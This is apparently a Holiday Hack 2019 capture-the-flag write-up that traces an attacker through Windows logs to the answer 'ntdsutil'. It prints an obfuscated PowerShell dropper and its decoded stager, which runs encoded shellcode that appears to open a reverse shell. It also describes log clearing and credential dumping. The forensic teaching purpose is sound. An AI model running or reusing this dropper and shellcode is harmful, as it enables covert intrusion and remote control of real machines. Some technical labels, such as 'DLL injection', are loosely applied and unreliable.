---
title: Determine Attacker Technique
tags: 
  - Windows
  - Forensics
  - PowerShell
  - Infosec
categories:
  - Holiday Hack 2019
date: 2020-01-19
---

What looks like the most helpful part of these logs are the `process` event types, so we can look at the `command_line` attribute of each object. 

The first thing we see is a bunch of calls to `evtutil` which seem to be clearing a bunch of different event types. This implies the attacker has already stopped the event service and so has admin privilleges.

We then see `services.exe` start a service named `KnKvTkXn`. This makes a new process with the following `command_line`:

```powershell
C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIACHe010CA7VWbW/aSBD+nEj5D1aFZFshGANt2kiVbs07wQnEQCAUnTb22iysvWCvCabtf78x4DS9plV70ll5We/OzM4888yM3TiwBeWBhEsD6fPZ6UkPh9iXlBy13w3yUi5h60A9OYGDnN2VPkrKFK1WNe5jGsyurqpxGJJAHN4LTSJQFBH/kVESKar0Rbqfk5Bc3D4uiC2kz1Lu70KT8UfMjmJJFdtzIl2gwEnPutzGqS8Fa8WoUORPn2R1eqHPCvV1jFmkyFYSCeIXHMZkVfqqphcOkhVRZJPaIY+4Kwr3NCiXCsMgwi65AWsbYhIx504kqxAD/IRExGEgQTSp+uFQkWHZC7mNHCckUSTnpWlqeDqb/aVMj7fexYGgPim0A0FCvrJIuKE2iQotHDiM3BF3BlqWCGngzVQVxDZ8SZRcEDOWl/7EjHJDnjLMfldJeakEUj0RqnnI4g9RmtyJGTnoya+4uc+7Ck+We4Dt69np2ambEYWuX/IEVifT/ZqAa0qPR3Qv9VEq5iUTrsGChwm85gZhTNTZM7BSbuHkf66tZ6IguClh2JmOOHVmoHFMZM63rGa6/3NC1ohLA1JLAuxTO+Oc8hq+xGVkH14hE7sBnxT5eECcGmHEwyLFLE3zD2p1n4pnXSOmzCEhsiFHEXgF6VO/d+aQBkVuBybxAaDDO/Au5wLTSSZ9ZHeS3Z6+g5BcZTiK8lIvhlKz85JFMCNOXkJBRI9HKBZ8v5S/uWvGTFAbRyIzN1MzHI/3VXkQiTC2IWcQ+8BaEZtilkKRl1rUIUZiUS+7V34ViCpmDEoALG0gEbCTAmCJlAkhuAhZVwsWEW1/xYgPEvuKbzDsQX0fab4nDvaII//bv4zIB9amSGQQvPAO0msxLvLSiIYCGkeKKlDov9z9ol/svaiG5JgFJauLqZGIlM+5qDRItikfj5jsEQgFRN8IuW/giLyrHNqD8ka7pVUEz6QdMNM2llRHT1Rvm/A7pOU2r106151FSwtr27mL2lHbbPVq/VarsulYo4qw6m1x3WsLsz5eLCzUuhtOxEMbtQa0uJxUdqsO3Vld5Ey22rudsXsqGtvdwnPcSc11vUvXutPfNmj3vto3iiXcrdXj7r3xZBQrUZ0+tfp02F92GuJxMmJ46GreWP+A6bYbLkY6N3dthJrzsr3ruKPm3HSSSYuShVbs0j7qI3Rt3w2HTW/lNSOkfRitq/4CrRsYYdRG9VHSecuM/rBhoGHd6ONb3iuf1zT9wVnXGw9j3PGZ02xp+mSMHBRqA2+uX97OgxQn7BlrI5VB3YekoYFMr4JalRLdPaz7TQ/VQWbkc4QbdDk8H4PNmwHo3A91hyMRtMeaNvI0D7nWfIKRAdLGGjUMXk3e98yeNhqV5vrjUp+Dz2S8eW920HnD7mmadu4/wl8N2eZqG4yNp8uN17L4Nb7Go81DWdMHT00XrdH5uaEbj6JVL3c2cO9A+zD8+CYlEDAoZ/PhC1r8rJWbOIzmmAFdoEtnBdrgYePYd3ucphqKkg7qJQkDwmDQwSjMaI4Y43ba9KFBw7g5DIF0Jg1hWS69ulKlZ0H12zDItq6uHsBFqJs9tQtdEnhini9uy8UiNPfitlKEEH8/ripfJcrBVj6dDikwz8bZ3riaVlTONd/q1v8K2bGO5/DP+TVk3/Z+cfpbMBbz+4B/2P1+448Q/dOw7zEVIGhBD2LkMAFfi/7IjRdfB/uMQObd45N+293G4uIGvhrOTv8BxRZ9dEQKAAA=''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
```

This is a dropper that's just decoding and decompressing some code, it's easier to understand if you cut out a lot of the powershell-ness:

```powershell
StartProcess(..., Script(Gzip_UNCOMPRESS(FromBase64String("BLAHBLAHBLAH"))))
```

Since this is a powershell script we can put the base64 into [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Gunzip()&input=SDRzSUFLbmUwMTBDQTdWV2JXL2FTQkQrbkVqNUQxYUZoSzBRakFOdG1raVZiczJiSVRpQkdNeGIwV2xqcjgzQzJnWjdEWmhlLy91TkFhZXBtdDYxSjUyVmwvWHV6T3pNTTgvTTJJbDlpOVBBRjJKZGFRaGZMczdQdWpqRW5pRG1hT1ZEUWNqdHpZUno2ZXdNRG5LYjdXNzRLSHdTeENsYXJXcUJoNmsvdTd1cnhtRklmSDU4THpZSlIxRkV2R2RHU1NSS3dsL0NjRTVDY3ZYNHZDQVdGNzRJdVQrTFRSWThZM1lTUzZyWW1oUGhDdmwyZXRZSkxKejZVelJXakhJeC8vbHpYcHBlS2JOaWZSMWpGb2w1STRrNDhZbzJZM2xKK0NxbEYvYVRGUkh6T3JYQ0lBb2NYaHhTdjN4ZEhQZ1Jkc2dEV05zUW5mQjVZRWQ1Q2NLQW41RHdPUFNGWTBDcGhlTzVtSWRsTnd3c1pOc2hpYUo4UVppbXRxZXoyUi9pOUhUeFUreHo2cEZpeStja0RGWUdDVGZVSWxGUnc3N055Qk54WnFCbDhKRDY3a3lTUUd3VExJbVk4MlBHQ3NMdm1CRWZ5RGFEN1ZlVnhOZEtJTlhsb1ZTQVhMNFZxQjdZTVNOSDFmd2JucVlFa09CNUlRR0E5L1hpL09MY3lTampkMjVmTXdaV1o5UERtb0I3WWplSTZFSHNrMUFxQ0RyY2cza1FKdkNhNjRjeGtXWXY0QXE1WmQyZ2haL3JLNWt3aUhxbS9lY0E5cVptUU8wWjZKeHlta3MyNmU3UG1Wa2pEdlZKTGZHeFI2Mk1mT0piS0JPSGtVT0V4VXpzQVh3Uzg2Y0RZdGNJSXk3bUtXeHBzbjlRcTN1VXYraXFNV1UyQ1pFRm1ZckFLMGlpOUwwengweUkrWmF2RXc4Z09yNEQrM0lPVUo1azBpZWFKOW50NlRzSTVhc01SMUZCNk1aUWMxWkJNQWhteEM0SXlJL282UWpGUERnczg5L2MxV1BHcVlVam5wbWJTVWNVVDdkVkF6L2lZV3hCemlEeXZyRWlGc1VzQmFJZ2FOUW1hbUpRTjdzMS95WU1WY3dZbEFGWTJrQWFZQ2NOMytBcEUwSnc4SkIxcVdnUTN2SldqSGdnY3lqOUJzTXVGUHFKN0FmcVlKZlkrZS85eTVoOHBHMktRd2JBSys4Z3VRWUxlRUV3YWNpaGY2U1lIZ2owMzI1LzFUckFqMnBJVGxrUXM5S1lxZ2xQR1oyenJaU01KMGdPQUlRY2dtK0VnYWZpaUh5b0hEdUUrRTUrcEZVRXo3amxNOTFTbDFSQlc2cTBkUGdkMEhJcnFOM1k5KzJGSm9lMTNkeEJyYWlsYTkxYVQ5TXFtN1poVnJoUmIvSDdib3ZyOWRGaVlTRHRhVERta3hiUytyUzBIRmYycXpiZEd4MWtqM2Z5aDcyNjM1YlUzWDdoMnM2NDVqanVqV004S2U4YnRET3M5dFRTTmU3VTZuRm5xRzdWVWlXcTA2M1dvNFBlc3QzZ3oyT1Q0WUVqdXlQbEZ0TmRKMXlZU3FEdld3ZzE1MlZyMzNiTTVseTNrN0ZHeVVJdWRXZ1A5UkM2dDU0R2c2YTdjcHNSa20vTmRkVmJvSFVESTR4YXFHNG03ZmRNN1EwYUtoclUxUjUrRExybHk1cXNUT3gxdlRFWjRiYkg3S1ltSytNUnNsRW85OTI1Y3ZNNDkxT2NzS3V1MVZRR2RTWkpRd2FaYmdWcGxXdTZuNng3VFJmVlFjYjBBb1FiZERtNEhJSE5oejdvREFlS0hTRHV0MGF5YkxxeWl4eGpQc1pJQldsMWpScHFVRTArZHZXdWJKclhjK1Y1cWN6Qlp6TGFmTlRiNkxKaGRXVlp2dlNlNGErTUxIMjE4MGZxOW1iamFrWndqKyt4dVptVVphVy9iVHBvalM0dlZVVjk1bHE5M043QXZYMzVkdkRwWGNvZElFOHVxSG12YVBHemJxN2pNSnBqQm5TQkxwMVZaeU1JRzZlKzJ3MW9xaUdLaDVHOUpLRlBHTXc3bUlnWnpSRmpnWlUyL3JSRHc4dzVUb0owTUExZ1diNStjeVVKTDRMU3QzR1FiZDNkVGNCSktCdmJLbmFJNy9KNW9iUXJsMHJRMmt1N1Nna2kvUFd3cXNFcUVjRlFJUjBNS1NoSHMreGdWa3JyS01lMHllai9oZXBVdlhQNFovOExWTi8yL3VIMGwrQXJGUTdoL3JENy9jWnZnZm5iZ1E4eDVTQnBRUHRoNURqNTNvei94SXBYWHdacFVpRHJ6dWxKUCs0ZVkzNzFBQjhNRitkL0E2MGhidnhKQ2dBQQ) and have a look at what it's doing:


```powershell
function uM1F {
	Param ($i46, $zVytt)		
	$vwxWO = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $vwxWO.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($vwxWO.GetMethod('GetModuleHandle')).Invoke($null, @($i46)))), $zVytt))
}

function nL9 {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $kESi,
		[Parameter(Position = 1)] [Type] $mVd_U = [Void]
	)
	
	$yv = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$yv.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $kESi).SetImplementationFlags('Runtime, Managed')
	$yv.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $mVd_U, $kESi).SetImplementationFlags('Runtime, Managed')
	
	return $yv.CreateType()
}

[Byte[]]$dc = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqFaAaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=")
		
$oDm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll VirtualAlloc), (nL9 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $dc.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($dc, 0, $oDm, $dc.length)

$lHZX = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll CreateThread), (nL9 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$oDm,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll WaitForSingleObject), (nL9 @([IntPtr], [Int32]))).Invoke($lHZX,0xffffffff) | Out-Null

```

The key things we see here are another base64 string, as well as calls to functions from `kernel32.dll`: `GetProcAddress`, `VirtualAlloc` & `CreateThread`. This looks a lot like code for DLL injection.

Though it's heavily obfuscated, we can still try to search for where this code is from: Googling for [`[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer`](https://www.google.com/search?ei=8sT3XZnYEoeO8gKkyLBQ&q=%5BSystem.Runtime.InteropServices.Marshal%5D%3A%3AGetDelegateForFunctionPointer&oq=%5BSystem.Runtime.InteropServices.Marshal%5D%3A%3AGetDelegateForFunctionPointer&gs_l=psy-ab.3..0j0i22i30.12331.13836..13931...2.0..0.192.1069.0j6......0....1j2..gws-wiz.....0..0i30.ZTKeiFd9N0c&ved=0ahUKEwiZmanH3rrmAhUHh1wKHSQkDAoQ4dUDCAs&uact=5) gives us [a post on the SANS ISC forums](https://isc.sans.edu/forums/diary/Fileless+Malicious+PowerShell+Sample/23081/) with a very similar script. But this still isn't relevant to the actual challenge.

After the DLL injection we see a ton of `net use` commands, which look like the attacker password spraying localhost. If we keep going however, we see a call to `ntdsutil.exe`.

This is a tool that's meant to be used for creating backups of SYSTEM & SAM hives, which together can be decoded to get raw password hashes. It's got a lot of legitimate uses, but in this case we see it being used to create a full backup of everything which the attacker will likely go on to try cracking offline.

The answer to the question is `ntdsutil`